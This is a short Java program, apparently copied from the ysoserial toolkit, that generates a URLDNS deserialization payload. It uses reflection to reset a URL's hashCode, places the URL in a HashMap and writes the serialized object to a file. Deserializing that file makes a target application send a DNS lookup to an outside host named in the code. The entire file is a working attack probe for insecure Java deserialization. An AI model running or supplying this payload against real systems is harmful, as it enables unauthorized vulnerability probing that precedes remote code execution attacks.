package Seri;//package ysoserial;
import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
//import java.util.Base64;
import java.util.HashMap;

public class URLDNS {

    public static void main(String[] args) throws Exception{
        URL url = new URL("http://abcabc.cldnnrjxtr.dgrh3.cn/");
        HashMap<Object ,Integer> hashmap = new HashMap<Object ,Integer>();
        Class clazz = url.getClass();
        Field field = clazz.getDeclaredField("hashCode");
        field.setAccessible(true);
        field.set(url ,-1);
        hashmap.put(url ,1);
        field.set(url ,-1);
        serializeFile(hashmap);

        System.out.println("field: " + field);
    }
    public static void serializeFile(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("bin/url.bin"));
        oos.writeObject(obj);
        oos.close();
    }
}
